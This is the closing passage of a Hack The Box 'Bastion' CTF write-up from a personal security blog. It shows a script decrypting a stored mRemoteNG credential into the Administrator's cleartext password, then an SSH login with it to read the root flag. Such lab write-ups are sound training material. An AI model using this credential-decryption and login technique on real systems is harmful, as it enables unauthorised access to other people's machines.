<td class="rouge-code"><pre><span class="nv">$ </span>python mremoteng_decrypt.py aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw<span class="o">==</span>
Password: thXLHM96BeKL0ER2
</pre></td>
</tr></tbody></table></code></div></div>
<p>Neat ! We got the Administrator’s password !</p>
<h1 id="roottxt">root.txt</h1>
<p>Lets see if we can login into the Administrator’s account via <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td>
<td class="rouge-code"><pre>ssh Administator@bastion.htb
Administrator@bastion.htb<span class="s1">'s password: 

Microsoft Windows [Version 10.0.14393]                                           
(c) 2016 Microsoft Corporation. All rights reserved.

administrator@BASTION C:\Users\Administrator&gt;cd Desktop

administrator@BASTION C:\Users\Administrator\Desktop&gt;dir                         
 Volume in drive C has no label.                                                 
 Volume Serial Number is 0CB3-C487                                               

 Directory of C:\Users\Administrator\Desktop                                     

23-02-2019  10:40    &lt;DIR&gt;          .                                            
23-02-2019  10:40    &lt;DIR&gt;          ..                                           
23-02-2019  10:07                32 root.txt                                     
               1 File(s)             32 bytes                                    
               2 Dir(s)  11.348.910.080 bytes free                               

administrator@BASTION C:\Users\Administrator\Desktop&gt;more root.txt               
9588XXXXXXXXXXXXXXXXXXXXXXXXXXXX

</span></pre></td>
</tr></tbody></table></code></div></div>
<h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3>
</div>
<div class="post-tail-wrapper text-muted">
<div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href="/categories/hackthebox/">hackthebox</a>
</div>
<div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/smb/" class="post-tag no-text-decoration">smb</a> <a href="/tags/mremoteng/" class="post-tag no-text-decoration">mremoteng</a> <a href="/tags/windows/" class="post-tag no-text-decoration">windows</a> <a href="/tags/ssh/" class="post-tag no-text-decoration">ssh</a>
</div>
<div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
<div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div>
<div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20Bastion%20-%20rizemon's%20blog&amp;url=https://rizemon.github.io/posts/bastion-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20The%20Box%20-%20Bastion%20-%20rizemon's%20blog&amp;u=https://rizemon.github.io/posts/bastion-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack%20The%20Box%20-%20Bastion%20-%20rizemon's%20blog&amp;url=https://rizemon.github.io/posts/bastion-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span>
</div>
</div>
</div>
</div></div>
<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">
<div class="access">
<div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2">
<li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a></li>
<li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a></li>
<li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a></li>
<li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a></li>
<li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></li>
</ul>
</div>
<div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a>
</div>
</div>
</div>
<div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav>
</div>
</div>
</div>
<div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
<div id="related-posts" class="mt-5 mb-2 mb-sm-4">
<h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3>
<div class="card-deck mb-4">
<div class="card"> <a href="/posts/sniper-htb/"><div class="card-body"> <span class="timeago small"> Mar 29, 2020 <i class="unloaded">2020-03-29T15:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Sniper</h3>
<div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div>
</div></a>
</div>
<div class="card"> <a href="/posts/cascade-htb/"><div class="card-body"> <span class="timeago small"> Jul 26, 2020 <i class="unloaded">2020-07-26T13:28:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Cascade</h3>
<div class="text-muted small"><p> Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM and a FlareVM. What I learnt from other writeups is that it was a good habit to map a domain n...</p></div>
</div></a>
</div>
<div class="card"> <a href="/posts/writeup-htb/"><div class="card-body"> <span class="timeago small"> Oct 13, 2019 <i class="unloaded">2019-10-13T15:35:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Writeup</h3>
<div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ e...</p></div>
</div></a>
</div>
</div>
</div>
<div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled"><p>-</p></span> <a href="/posts/swagshop-htb/" class="btn btn-outline-primary"><p>Hack The Box - Swagshop</p></a>
</div>
</div></div></div>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center">
<div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div>
<div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div>
</div></footer>
</div>
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content">
<div id="search-hints">
<h4 class="text-muted mb-4">Trending Tags</h4>
<a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a>
</div>
<div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
</div></div>
</div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
